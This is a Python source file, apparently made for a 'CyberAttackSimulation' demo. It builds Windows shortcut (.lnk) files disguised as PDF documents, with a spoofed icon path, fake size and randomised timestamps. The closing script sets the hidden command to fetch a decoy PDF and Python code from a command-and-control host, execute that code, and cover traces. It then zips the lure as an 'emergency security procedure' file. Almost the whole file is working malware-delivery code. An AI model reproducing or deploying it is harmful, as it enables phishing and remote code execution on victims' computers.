#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    CyberAttackSimulation for CyberTalk
#    Copyright (C) 2025  CyberAttackSimulation

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

# https://github.com/wariv/DarkLnk/blob/master/DarkLnk/DarkLnk.cs

import os
import re
import struct
import random
import datetime

class DarkLnk:
    def __init__(self):
        self._r = random.Random()
        self._fakeSize = (2**31) - 1
        self._fakePath = r"Program Files\Adobe\Acrobat"
        self._fakeExtension = "pdf"
        self._fakeExtensionShort = "pdf"
        self._psCommand = '-command "calc.exe"'
        self._outputName = "calc"
        self._realExecPath = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        self._randomPadding = False
        self._nullPadding = False
        self._rootDir = "C:\\"
        self._fakeTimes = True

    @property
    def LinkSize(self):
        return self._fakeSize
    @LinkSize.setter
    def LinkSize(self, value):
        self._fakeSize = value

    @property
    def LinkExtension(self):
        return self._fakeExtension
    @LinkExtension.setter
    def LinkExtension(self, value):
        self._fakeExtension = value
        self._fakeExtensionShort = value[:3]

    @property
    def OutputName(self):
        return self._outputName
    @OutputName.setter
    def OutputName(self, value):
        if re.match(r"[a-zA-Z0-9]+\.lnk$", value):
            self._outputName = value[:-4]
        else:
            self._outputName = value

    @property
    def Command(self):
        return self._psCommand
    @Command.setter
    def Command(self, value):
        self._psCommand = value

    @property
    def LinkPath(self):
        return self._fakePath
    @LinkPath.setter
    def LinkPath(self, value):
        self._fakePath = value

    @property
    def RandomPadding(self):
        return self._randomPadding
    @RandomPadding.setter
    def RandomPadding(self, value):
        self._randomPadding = True
        self._nullPadding = False

    @property
    def NullPadding(self):
        return self._nullPadding
    @NullPadding.setter
    def NullPadding(self, value):
        self._nullPadding = value
        self._randomPadding = False

    @property
    def RootDirectory(self):
        return self._rootDir
    @RootDirectory.setter
    def RootDirectory(self, value):
        self._rootDir = value[:3]

    @property
    def FakeTime(self):
        return self._fakeTimes
    @FakeTime.setter
    def FakeTime(self, value):
        self._fakeTimes = value

    @property
    def Binary(self):
        return self._realExecPath
    @Binary.setter
    def Binary(self, value):
        self._realExecPath = value

    def JoinBytes(self, a: bytes, b: bytes) -> bytes:
        return a + b

    def InjectBytes(self, source: bytes, position: int, injectbytes: bytes) -> bytes:
        result_length = max(len(source), position + len(injectbytes))
        result = bytearray(result_length)
        result[:len(source)] = source
        result[position:position+len(injectbytes)] = injectbytes
        return bytes(result)

    def Date2FileTime(date_time: datetime.datetime) -> bytes:
        file_time = int((date_time - datetime.datetime(1601, 1, 1)).total_seconds() * 1e7)
        return struct.pack("<Q", file_time)

    def GenerateRandomBinaryData(self, length, nullPadding=True, paddingLength=1):
        data = bytearray(length)
        startPoint = paddingLength if nullPadding else 0
        endPoint = paddingLength if nullPadding else 0
        for i in range(startPoint, length - endPoint):
            data[i] = self._r.randint(1, 255)
        return bytes(data)

    def GenerateNullPadding(self, length):
        return bytes([0] * length)

    def BuildExtensionItem(self):
        itemSize = 25
        dataSection = bytearray(23)
        shortExtension = ("/" + self._rootDir.upper()).encode("utf-8")
        dataSection[:len(shortExtension)] = shortExtension
        return self.JoinBytes(struct.pack("<H", itemSize), dataSection)

    def BuildFakePathItem(self):
        padding1 = bytes([0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
        pathUtf8 = (self._fakePath + "." + self._fakeExtension).encode("utf-8")

        if self._randomPadding:
            padding2 = self.GenerateRandomBinaryData(self._r.randint(1, 2048), True, self._r.randint(1, 32))
        elif self._nullPadding:
            padding2 = self.GenerateNullPadding(self._r.randint(1, 2048))
        else:
            padding2 = b"\x00"

        pathUnicode = (self._fakePath + "." + self._fakeExtension).encode("utf-16le")
        termination = bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00])

        itemSize = len(padding1) + len(pathUtf8) + len(padding2) + len(pathUnicode) + len(termination)
        totalSize = struct.pack("<H", itemSize)

        result = b""
        result = self.JoinBytes(result, totalSize)
        result = self.JoinBytes(result, padding1)
        result = self.JoinBytes(result, pathUtf8)
        result = self.JoinBytes(result, padding2)
        result = self.JoinBytes(result, pathUnicode)
        result = self.JoinBytes(result, termination)
        return result

    def BuildItemIDList(self):
        shellLinkRootDirectoryItem = bytes([
            0x14, 0x00, 0x1F, 0x50, 0xE0, 0x4F, 0xD0, 0x20, 0xEA, 0x3A, 0x69, 0x10, 0xA2, 0xD8, 0x08,
            0x00, 0x2B, 0x30, 0x30, 0x9D
        ])
        ExtensionItem = self.BuildExtensionItem()
        ExtentionPathItem = self.BuildFakePathItem()

        idListSize = len(shellLinkRootDirectoryItem) + len(ExtensionItem) + len(ExtentionPathItem)
        totalSize = struct.pack("<H", idListSize)

        result = b""
        result = self.JoinBytes(result, totalSize)
        result = self.JoinBytes(result, shellLinkRootDirectoryItem)
        result = self.JoinBytes(result, ExtensionItem)
        result = self.JoinBytes(result, ExtentionPathItem)
        return result

    def BuildRealExecPath(self):
        header = bytes([
            0x64, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x1C, 0x00, 0x00, 
            0x00, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x67, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x03, 0x00, 
            0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00
        ])

        pathUtf8 = self._realExecPath.encode("utf-8")
        padding1 = b"\x00\x00"
        pathUnicode = self._realExecPath.encode("utf-16le")
        pathUnicodeLength = struct.pack("<H", len(pathUnicode)//2)
        argsUnicode = self._psCommand.encode("utf-16le")
        argsUnicodeLength = struct.pack("<H", len(argsUnicode)//2)

        result = b""
        result = self.JoinBytes(result, header)
        result = self.JoinBytes(result, pathUtf8)
        result = self.JoinBytes(result, padding1)
        result = self.JoinBytes(result, pathUnicodeLength)
        result = self.JoinBytes(result, pathUnicode)
        result = self.JoinBytes(result, argsUnicodeLength)
        result = self.JoinBytes(result, argsUnicode)

        headersize = 41 + len(pathUtf8) + 2
        result = self.InjectBytes(result, 0, struct.pack("<I", headersize))
        return result

    def BuildLink(self):
        linkHeader = bytes([
            0x4C, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x46, 0xAB, 0x00, 0x08, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        ])
        LnkBytes = linkHeader

        if self._fakeSize != 0:
            fksize = struct.pack("<I", self._fakeSize)
            LnkBytes = self.InjectBytes(LnkBytes, 52, fksize)

        if self._fakeTimes:
            dt = datetime.datetime.now() - datetime.timedelta(days=self._r.randint(29, 600))
            LnkBytes = self.InjectBytes(LnkBytes, 28, DarkLnk.Date2FileTime(dt))
            LnkBytes = self.InjectBytes(LnkBytes, 36, DarkLnk.Date2FileTime(dt + datetime.timedelta(minutes=self._r.randint(1,30))))
            LnkBytes = self.InjectBytes(LnkBytes, 44, DarkLnk.Date2FileTime(dt + datetime.timedelta(hours=self._r.randint(1,24))))

        LnkBytes += self.BuildItemIDList()
        LnkBytes += self.BuildRealExecPath()

        with open(f"./{self._outputName}.lnk", "wb") as f:
            f.write(LnkBytes)

from os import chdir
from sys import executable
from os.path import join, dirname
from zipfile import ZipFile, ZIP_DEFLATED

pythonw = join(dirname(executable), "pythonw.exe")

d = DarkLnk()
d.LinkExtension = "pdf"
# d.FakeTime = True
# d.LinkPath = 
# d.RandomPadding = 
# d.NullPadding = True
# d.RootDirectory = "D:\\"
# d.LinkSize = 
d.OutputName = join("arsenal", "procedure_urgence_securite.pdf")
d.Binary = pythonw or r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
d.Command = '''-c "from urllib.request import urlopen as u;import os; [(f:=os.path.basename(url),open(f,'wb').write(u(url).read()),os.system(f'attrib +h {f}'),os.startfile(f)) if 'pdf' in url else exec(u(url).read().decode()) for url in map(lambda x: 'http://a.c2:8080/'+x, ('procedure_urgence_securite.pdf','py'))]"''' or '-c "import os,sys;os.system(f\'start .procedure_urgence_securite.pdf & ""{sys.executable}"" .malware.py\')"' or '-command "mkdir test"'
d.Command = '''-c "from urllib.request import urlopen as u;import os; [(f:=os.path.basename(url),open(f,'wb').write(u(url).read()),os.startfile(f),os.remove(f+'.lnk')) if 'pdf' in url else exec(u(url).read().decode(),globals()) for url in map(lambda x: 'http://a.c2:8080/'+x, ('procedure_urgence_securite.pdf','py'))]"''' or '-c "import os,sys;os.system(f\'start .procedure_urgence_securite.pdf & ""{sys.executable}"" .malware.py\')"' or '-command "mkdir test"'
d.BuildLink()

with ZipFile(join("arsenal", "procedure_urgence_securite.zip"), "w", ZIP_DEFLATED) as file:
    chdir("arsenal")
    file.write('procedure_urgence_securite.pdf.lnk')
